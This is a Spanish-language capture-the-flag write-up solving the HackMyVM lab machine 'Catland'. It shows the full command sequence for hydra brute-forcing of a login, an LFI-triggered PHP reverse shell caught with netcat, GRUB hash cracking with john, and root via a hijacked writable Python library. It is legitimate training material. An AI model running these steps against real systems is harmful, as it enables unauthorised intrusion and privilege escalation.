---
layout: post
title: Catland - Hackmyvm
tags: [ctf, hackmyvm]
---

**Autor**: Cromiphi \\
**Dificultad**: Medio

![img](/imgs/write-ups/hackmyvm/catland/catland.png#center)

## Reconocimiento

**Nota**: Al iniciar la máquina se puede ver el dominio "catland.hmv" y la dirección IP que serán necesarios añadir a "/etc/hosts".

Comienzo con una enumeración simple de los puertos abiertos en la máquina.
```
$ sudo nmap -p- 192.168.1.80       
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-13 19:45 UTC
Nmap scan report for 192.168.1.80
Host is up (0.00013s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:0A:57:3D (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.18 seconds
```

### 80 (http)

Utilizo "gobuster" para enumerar algunos archivos y subdirectorios.

```
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u "http://catland.hmv/" -x php,txt,html,zip,bak 
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://catland.hmv/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Extensions:              html,zip,bak,php,txt
[+] Timeout:                 10s
===============================================================
2023/01/13 19:53:04 Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 276]
/index.php            (Status: 200) [Size: 757]
/images               (Status: 301) [Size: 311] [--> http://catland.hmv/images/]
/.php                 (Status: 403) [Size: 276]
/gallery.php          (Status: 200) [Size: 479]
Progress: 11625 / 7643004 (0.15%)^C
[!] Keyboard interrupt detected, terminating.
```

Al cargar "/gallery.php" se muestran varias imágenes de gatos.

```
$ curl -X GET "http://catland.hmv/gallery.php"
<!doctype html>
<html>
<head>
  <title>Image Gallery</title>
</head>
<body>
  <h1>Image Gallery</h1>
  <div id="gallery">
    <a href="images/laura-with-cat.jpeg"><img src="images/laura-with-cat.jpeg" alt="Image"></a><a href="images/sushi-cat.jpeg"><img src="images/sushi-cat.jpeg" alt="Image"></a><a href="images/tired-cat.jpeg"><img src="images/tired-cat.jpeg" alt="Image"></a><a href="images/wc-cat.jpeg"><img src="images/wc-cat.jpeg" alt="Image"></a>  </div>
</body>
</html>
```

Aquí ya no hay mucho que hacer, por lo que anoto como sospechoso el nombre "laura" que aparece en el nombre de una de las imágenes.

### Subdominio

Para continuar con la enumeración, utilizo "ffuf" en busca de subdominios y rápidamente aparece "admin". Lo añado a "/etc/hosts" y lo visito a ver que hay.

```
$ ffuf -w /usr/share/seclists/Discovery/DNS/namelist.txt -u http://catland.hmv -H "Host: FUZZ.catland.hmv" -fs 757
[...]
admin                   [Status: 200, Size: 1068, Words: 103, Lines: 24, Duration: 7ms]
```

Al intentar acceder al subdominio, me redirige al dominio principal. Tras realizar la peticion con "curl" compruebo que esto es debido a que se ejecuta un script llamado "redirect.js".

```
$ curl -X GET "http://admin.catland.hmv/"     
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Admin panel</title>
</head>
<script src="redirect.js"></script>
<script>
  redirectToSubdomain();
</script>
<body style="background-color: #003366; color: white; font-family: sans-serif;">
  <h1 style="text-align: center;">Staff connection</h1>
  <form id="login-form" action="" method="post" style="max-width: 500px; margin: auto;">
    <label for="username" style="display: block;">Login:</label>
    <input type="text" id="username" name="username" style="width: 100%; padding: 10px; box-sizing: border-box; margin-bottom: 20px;">
    <label for="password" style="display: block;">Password:</label>
    <input type="password" id="password" name="password" style="width: 100%; padding: 10px; box-sizing: border-box; margin-bottom: 20px;">
    <button type="submit" style="width: 100%; padding: 10px; background-color: #0099cc; color: white; font-size: 16px; cursor: pointer;">Connect</button>
  </form> 
  <div id="error-message" style="color: red;"></div>
</body>
</html>

Invalid username or password% 
```

Para evitar que este script se ejecute, utilizo burpsuite para eliminar esa parte del código.

![img](/imgs/write-ups/hackmyvm/catland/catland_1.png#center)

Una vez evitada la redirección, me encuentro con una página de login.

![img](/imgs/write-ups/hackmyvm/catland/catland_2.png#center)

Tras intentar logearme usando "hydra" y distintas listas de contraseñas sin ningún resultado, recurro a "cupp" para generar una lista con el nombre de "laura".

```
sudo cupp -i
 ___________ 
   cupp.py!                 # Common
      \                     # User
       \   ,__,             # Passwords
        \  (oo)____         # Profiler
           (__)    )\   
              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
                            [ Mebus | https://github.com/Mebus/]


[+] Insert the information about the victim to make a dictionary
[+] If you don't know all the info, just hit enter when asked! ;)

> First Name: laura
> Surname: 
> Nickname: 
> Birthdate (DDMMYYYY): 


> Partners) name: 
> Partners) nickname: 
> Partners) birthdate (DDMMYYYY): 


> Child's name: 
> Child's nickname: 
> Child's birthdate (DDMMYYYY): 


> Pet's name: 
> Company name: 


> Do you want to add some key words about the victim? Y/[N]: y
> Please enter the words, separated by comma. [i.e. hacker,juice,black], spaces will be removed: cat        
> Do you want to add special chars at the end of words? Y/[N]: 
> Do you want to add some random numbers at the end of words? Y/[N]:
> Leet mode? (i.e. leet = 1337) Y/[N]: 

[+] Now making a dictionary...
[+] Sorting list and removing duplicates...
[+] Saving dictionary to laura.txt, counting 376 words.
> Hyperspeed Print? (Y/n) : n
[+] Now load your pistolero with laura.txt and shoot! Good luck!
```

Una vez generada, utilizo hydra para realizar el ataque de fuerza bruta.

```
$ hydra -l laura -P laura.txt admin.catland.hmv http-post-form "/index.php:username=^USER^&password=^PASS^:Invalid username or password"
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-01-13 20:00:29
[DATA] max 16 tasks per 1 server, overall 16 tasks, 376 login tries (l:1/p:376), ~24 tries per task
[DATA] attacking http-post-form://admin.catland.hmv:80/index.php:username=^USER^&password=^PASS^:Invalid username or password
[80][http-post-form] host: admin.catland.hmv   login: laura   password: Laura_2008
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-01-13 20:00:32
```

Ahora sí ha funcionado!!

### LFI

Una vez logeado como el usuario Laura, encuentro una vulnerabilidad LFI en la siguiente url.

```
http://admin.catland.hmv/user.php?page=/etc/passwd
```

También encuentro una página en la que se pueden subir únicamente archivos "zip" y "rar" al servidor.

Sabiendo esto, puedo conseguir una reverse shell.

## Explotación

Para conseguir la reverse shell, primero hay que subirla al servidor. En este caso yo he utilizado [esta](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) de **pentestmonkey**, solo que le he cambiado la extensión para poder pasar el filtro.

![img](/imgs/write-ups/hackmyvm/catland/catland_3.png#center)

Una vez subida, utilizo el LFI encontrado anteriormente para leer el archivo y obtener la conexión.

```
http://admin.catland.hmv/user.php?page=uploads/shell.zip
```

```
$ nc -lvnp 1234
Connection from 192.168.1.80:55774
Linux catland.hmv 5.10.0-20-amd64 #1 SMP Debian 5.10.158-2 (2022-12-13) x86_64 GNU/Linux
 21:05:46 up 21 min,  0 users,  load average: 0.04, 0.02, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

Y ya estoy dentro :)

## Escalado de privilegios

Una vez dentro, en el archivo de configuración "config.php" encuentro credenciales para acceder a la base de datos de catland.

```
$ cat /var/www/admin/config.php
<?php

$hostname = "localhost";
$database = "catland";
$username = "admin";
$password = "catlandpassword123";
$conn = mysqli_connect($hostname, $username, $password, $database);
if (!$conn) {
    die("Connection failed: " . mysqli_connect_error());
}

?>
```

Cotilleando un poco la base de datos "catland" encuentro un comentario que dice "Change grub password":"Cambiar contraseña grub". ¿Será por que no es segura?

```
www-data@catland:/var/www/admin$ mysql -u admin -pcatlandpassword123
mysql -u admin -pcatlandpassword123
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 308
Server version: 10.5.18-MariaDB-0+deb11u1 Debian 11

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]>
[...]
MariaDB [catland]> select * from comment;
select * from comment;
+----------------------+
| grub                 |
+----------------------+
| change grub password |
+----------------------+
1 row in set (0.001 sec)

MariaDB [catland]>
```

Copio el hash de la contraseña a mi máquina para intentar crackearlo con john. El hash es únicamente "grub.pbkdf2.sha512.10000.[...]7EBBC", el resto se puede ignorar.

```
$ cat /etc/grub.d/01_password
cat /etc/grub.d/01_password
#!/bin/sh
set -e
cat << EOF
set superusers="root"
password_pbkdf2 root grub.pbkdf2.sha512.10000.CAEBC99F7ABA2AC4E57FFFD14649554857738C73E8254222A3C2828D2B3A1E12E84EF7BECE42A6CE647058662D55D9619CA2626A60DB99E2B20D48C0A8CE61EB.6E43CABE0BC795DC76072FC7665297B499C2EB1B020B5751EDC40A89668DBC73D9F507517474A31AE5A0B45452DAD9BD77E85AC0EFB796A61148CC450267EBBC
EOF
```

```
$ john hash --wordlist=/usr/share/seclists/Passwords/rockyou.txt
[...]
$ john hash --show                                              
?:berbatov

1 password hash cracked, 0 left
```

Efectivamente era necesario cambiar la contraseña ya que era muy debil ;)

Con esta contraseña puedo utilizar ssh para iniciar sesión como el usuario Laura.

```
$ ssh laura@192.168.1.80             
[...]
Last login: Sat Jan  7 14:44:44 2023 from 192.168.0.29
laura@catland:~$ :)
```

Compruebo los permisos de sudo:

```
laura@catland:~$ sudo -l
Matching Defaults entries for laura on catland:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User laura may run the following commands on catland:
    (ALL : ALL) NOPASSWD: /usr/bin/rtv --help
```

Parece ser que Laura puede ejecutar "rtv --help" como usuario root. Si "rtv" no tuviese el argumento "--help" el escalado de privilegios sería mucho mas sencillo.

Tras leer el ejecutable, identifico que es código en python por lo que quizá se pueda realizar un ataque de "Libray Hijacking" o tener permisos de escritura en alguna libreria que utilice.

```
laura@catland:~$ cat /usr/bin/rtv
#!/usr/bin/python3
# EASY-INSTALL-ENTRY-SCRIPT: 'rtv==1.27.0','console_scripts','rtv'
import re
import sys

# for compatibility with easy_install; see #2198
__requires__ = 'rtv==1.27.0'

try:
    from importlib.metadata import distribution
except ImportError:
    try:
        from importlib_metadata import distribution
    except ImportError:
        from pkg_resources import load_entry_point


def importlib_load_entry_point(spec, group, name):
    dist_name, _, _ = spec.partition('==')
    matches = (
        entry_point
        for entry_point in distribution(dist_name).entry_points
        if entry_point.group == group and entry_point.name == name
    )
    return next(matches).load()


globals().setdefault('load_entry_point', importlib_load_entry_point)


if __name__ == '__main__':
    sys.argv[0] = re.sub(r'(-script\.pyw?|\.exe)?$', '', sys.argv[0])
    sys.exit(load_entry_point('rtv==1.27.0', 'console_scripts', 'rtv')())
```

Tras probar distintas cosas, encuentro que "metadata.py" utilizado en "rtv" tiene permisos de escritura.

```
laura@catland:/$ find / -name metadata* -ls 2>/dev/null
   932760     20 -rw-r--rw-   1 root     root        18210 Feb 28  2021 /usr/lib/python3.9/importlib/metadata.py
```

Edito "metadata.py" y añado una linea que ejecute el comando "bash" en la función "distribution" (usada en rtv).

```
def distribution(distribution_name):
    """Get the ``Distribution`` instance for the named package.

    :param distribution_name: The name of the distribution package as a string.
    :return: A ``Distribution`` instance (or subclass thereof).
    """
    os.system('bash')
    return Distribution.from_name(distribution_name)
```

Una vez guardado el archivo solo queda hacer uso de los poderes de "sudo" y la máquina estaría resuelta.

```
laura@catland:~$ sudo rtv --help
root@catland:/home/laura# whoami
root
root@catland:/home/laura# :)
```

Muchas gracias a **Cromiphi** por esta máquina.
